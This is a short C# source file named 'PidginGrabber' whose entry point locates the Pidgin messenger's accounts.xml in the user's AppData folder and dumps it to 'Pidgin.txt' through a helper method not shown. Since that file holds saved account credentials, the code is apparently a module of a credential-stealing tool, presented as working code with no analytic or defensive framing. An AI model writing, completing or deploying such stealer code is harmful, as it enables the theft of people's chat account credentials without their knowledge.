namespace PidginGrabber
{
    using System;
    using System.IO;

    internal partial class Program
    {
        private static readonly string PidginPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @".purple\accounts.xml");

        private static void Main() => 
            Go.GetDataPidgin(PidginPath, "Pidgin.txt");
    }
}